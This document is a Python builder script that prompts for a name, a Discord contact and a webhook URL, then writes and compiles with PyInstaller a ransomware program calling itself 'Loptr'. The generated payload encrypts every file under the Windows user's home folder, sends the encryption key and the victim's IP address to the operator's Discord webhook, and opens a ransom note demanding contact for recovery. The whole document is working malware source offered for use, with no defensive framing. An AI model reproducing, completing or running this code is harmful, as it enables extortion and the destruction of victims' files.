import subprocess
import os

user = str(os.environ["USERNAME"])

def compile(code, name):
    print("Creating main script...")
    f = open("main.py", "w")
    f.write(code)
    f.close()
    print("Compiling code...")
    subprocess.run("C:\\Users\\" + user + "\\AppData\\Local\\Programs\\Python\\Python39\\Scripts\\pyinstaller.exe main.py --uac-admin --onefile --noconsole --name " + name, shell=True)
    print("Compile complete!")

def main():
    name = input(str("Enter name for executable: "))
    discordname = input(str("Enter your Discord name and tag: "))
    discordname2 = "'" + discordname + "'"
    webhook = input(str("Enter Discord webhook: "))
    webhook2 = "'" + webhook + "'"
    code = """import os
import subprocess
from cryptography.fernet import Fernet
import re
import json
import requests
from pathlib import Path

key = Fernet.generate_key()
user = str(os.environ["USERNAME"])

def crypt(filename):
    f = Fernet(key)
    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def warn():
    name = """ + discordname2 + """ #change to your discord name and tag
    ip = requests.get('https://api.ipify.org').text
    url = """ + webhook2 + """ # webhook url 
    data = {}
    data["content"] = "Key Content for " + user + ": " + str(key) 
    data["username"] = ip
    requests.post(url, data=json.dumps(data), headers={"Content-Type": "application/json"})
    f = open("loptr.txt", "w")
    f.write("Ooops you have been infected with Loptr.py! your files are encrypted! Contact " + name + " on discord to get your files back!")
    f.close()
    subprocess.call(r"notepad loptr.txt", shell=False)


def main():
    path1 = "C:\\\\Users\\\\" + user
    my_path = Path(path1)
    for file in my_path.glob("**/*.*"):
        crypt(file)
    warn()

main()"""
    compile(code, name)

main()